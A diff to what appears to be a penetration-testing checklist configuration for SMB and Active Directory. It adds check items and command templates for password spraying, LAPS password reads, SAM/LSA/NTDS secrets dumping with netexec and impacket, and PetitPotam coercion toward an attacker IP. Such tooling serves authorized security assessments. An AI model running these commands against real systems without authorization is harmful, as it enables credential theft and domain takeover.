@@ -23,6 +23,16 @@ checks:
     label: "Tested for MS17-010 EternalBlue"
   - key: smb-enum-users
     label: "Enumerated users via RID cycling"
+  - key: smb-pass-pol
+    label: "Pulled domain password policy (lockout threshold + min length)"
+  - key: smb-password-spray
+    label: "Performed password spray with discovered users (within lockout safety)"
+  - key: smb-laps-dump
+    label: "Tested LAPS read access (ms-Mcs-AdmPwd attribute)"
+  - key: smb-secretsdump
+    label: "Dumped SAM / LSA secrets after gaining administrative access"
+  - key: smb-coerce
+    label: "Attempted coercion (PetitPotam, PrinterBug) for relay / NetNTLMv2 capture"
 commands:
   - label: "Enumerate shares (null session)"
     template: "smbclient -L //{IP}/ -N"
@@ -32,10 +42,22 @@ commands:
     template: "enum4linux-ng -A {IP}"
   - label: "smbmap shares + permissions"
     template: "smbmap -H {IP} -P {PORT}"
-  - label: "crackmapexec enumerate"
+  - label: "crackmapexec enumerate (legacy)"
     template: "crackmapexec smb {IP} -u '' -p ''"
+  - label: "netexec / nxc null-session enum"
+    template: "nxc smb {IP} -u '' -p '' --shares --users --pass-pol"
+  - label: "netexec password spray"
+    template: "nxc smb {IP} -u users.txt -p 'Spring2025!' --continue-on-success"
+  - label: "netexec LAPS dump (with creds)"
+    template: "nxc smb {IP} -u <user> -p <pass> --laps"
+  - label: "netexec secretsdump (admin creds)"
+    template: "nxc smb {IP} -u administrator -p <pass> --sam --lsa --ntds"
+  - label: "impacket-secretsdump (DA / DCSync)"
+    template: "impacket-secretsdump <DOMAIN>/<user>:<pass>@{IP}"
   - label: "rpcclient null session"
     template: "rpcclient -U '' -N {IP}"
+  - label: "PetitPotam coercion (relay listener required)"
+    template: "python3 PetitPotam.py <attacker-ip> {IP}"
 default_creds:
   - username: guest
     password: ""
